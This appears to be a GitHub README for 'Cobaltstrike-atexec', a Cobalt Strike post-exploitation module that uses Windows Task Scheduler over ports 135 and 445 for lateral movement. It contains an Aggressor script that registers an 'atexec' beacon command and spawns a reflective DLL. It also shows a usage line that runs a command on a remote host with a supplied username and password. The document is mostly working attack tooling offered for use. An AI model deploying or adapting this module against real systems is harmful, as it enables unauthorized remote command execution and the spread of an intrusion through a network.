# Cobaltstrike-atexec

To perform lateral movement using Task Scheduler, communication with ports 135 and 445 is required.

- Main implementation：[How to implement an Atexec](https://payloads.online/archivers/2020-06-28/1)

- Key Technologies：[Building Post-Exploitation Modules via Reflective DLL Injection Lesson One）](https://payloads.online/archivers/2020-03-02/1)

## Usage Instructions

1. Loading[atexec.cna](https://github.com/Rvn0xsy/Cobaltstrike-atexec)

```perl
$dll = "reflective_dll.dll";
beacon_command_register(
	"atexec", 
	"atexec text to beacon log", 
	"Synopsis: atexec [host] [username] [password] [command] [domain]\n");

alias("atexec", {
    $args = substr($0, 7);
    bdllspawn($1, script_resource($dll), $args, "Atexec....", 10000, false);
	blog($1, "My arguments are:" . substr($0, 7) . "\n");
});
```

2. Upon acquisition of the Beacon session

```
beacon> help atexec
Synopsis: atexec [host] [username] [password] [command] [domain]
```